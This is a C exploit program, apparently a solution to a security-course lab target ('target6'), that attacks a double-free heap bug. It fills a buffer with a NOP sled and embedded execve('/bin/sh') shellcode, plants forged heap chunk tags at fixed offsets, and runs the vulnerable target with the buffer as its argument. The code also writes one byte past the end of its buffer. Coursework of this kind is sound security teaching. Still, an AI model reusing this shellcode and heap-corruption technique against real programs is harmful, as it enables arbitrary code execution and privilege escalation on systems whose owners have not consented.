#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
//#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define DFBUFLENGTH 192
#define NOP    '\x90'

int main(void)
{
  char *args[3];
  char *env[1];
	static char shellcode[] =
  "\x04\xeb\x90\x90\x91\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

	char doubleFreeBuf[DFBUFLENGTH];
	int shellcodeSize = sizeof(shellcode)-1;
	// Avoid null terminating char in the string 

	int i;	
	for (i=0; i<DFBUFLENGTH; i++)
		doubleFreeBuf[i] = NOP;
	for(i=0; i < shellcodeSize; i++)
		doubleFreeBuf[i] = shellcode[i];
	
	char fakeTagPrev[]= "\x01\x04\xee\x28";
	char fakeTagNext[]= "\x20\x21\xfe\x68";
	
	for(i=0; i < 4; i++){
		doubleFreeBuf[i+72] = fakeTagPrev[3-i];
	//	printf("%02x\n", fakeTagPrev[3-i]);
		doubleFreeBuf[i+76] = fakeTagNext[3-i];
	//	printf("%02x\n", fakeTagNext[3-i]);

	}
	
	doubleFreeBuf[DFBUFLENGTH]='\x00';
 args[0] = TARGET; args[1] = doubleFreeBuf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
